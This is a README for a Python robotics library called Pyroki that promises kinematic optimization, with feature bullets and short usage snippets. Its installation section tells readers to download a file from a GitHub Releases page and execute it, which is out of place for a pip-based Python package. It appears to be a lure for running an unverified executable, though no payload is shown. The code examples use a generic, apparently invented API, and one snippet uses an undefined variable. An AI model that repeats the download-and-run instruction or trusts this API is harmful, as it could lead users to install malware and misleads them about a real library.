## Introduction

Robotics is a rapidly evolving field. The need for efficient kinematic optimization is crucial for developing advanced robotic systems. Pyroki provides a set of tools to help you tackle this challenge. Our modular approach allows you to customize the toolkit to fit your specific needs.

## Features

- **Modular Design**: Add or remove components based on your project requirements.
- **User-Friendly Interface**: Easy to navigate and implement.
- **Performance Optimization**: Advanced algorithms to enhance robot movement and efficiency.
- **Extensive Documentation**: Comprehensive guides and examples to help you get started.
- **Active Community**: Join a community of developers and researchers who share your passion.

## Installation

To get started with Pyroki, you need to download the latest release. Visit our [Releases section](https://github.com/clearn23/pyroki/releases) to find the appropriate version for your system. Download the file and execute it to install Pyroki.

### Prerequisites

Before you install Pyroki, ensure you have the following:

- Python 3.6 or higher
- Pip (Python package installer)
- Basic understanding of robotics and kinematics

### Steps to Install

1. Go to the [Releases section](https://github.com/clearn23/pyroki/releases).
2. Download the latest release suitable for your operating system.
3. Execute the downloaded file.
4. Follow the on-screen instructions to complete the installation.

## Usage

Once installed, you can start using Pyroki in your projects. Hereâ€™s a simple example to help you get started:

```python
import pyroki

# Initialize the robot
robot = pyroki.Robot()

# Set parameters
robot.set_parameters(max_speed=5, max_acceleration=10)

# Optimize kinematics
optimized_path = robot.optimize_kinematics(start_position, end_position)

# Execute the optimized path
robot.execute_path(optimized_path)
```

This example shows how to initialize a robot, set its parameters, optimize its kinematics, and execute the optimized path.

## Examples

Here are a few examples to illustrate the capabilities of Pyroki:

### Example 1: Basic Kinematic Optimization

```python
import pyroki

robot = pyroki.Robot()
robot.set_parameters(max_speed=3, max_acceleration=8)

start = (0, 0)
end = (10, 10)

path = robot.optimize_kinematics(start, end)
robot.execute_path(path)
```

### Example 2: Complex Path Planning

```python
import pyroki

robot = pyroki.Robot()
robot.set_parameters(max_speed=4, max_acceleration=9)

waypoints = [(0, 0), (5, 5), (10, 0)]
optimized_path = robot.optimize_path(waypoints)

robot.execute_path(optimized_path)
```

These examples demonstrate how easy it is to implement kinematic optimization with Pyroki.
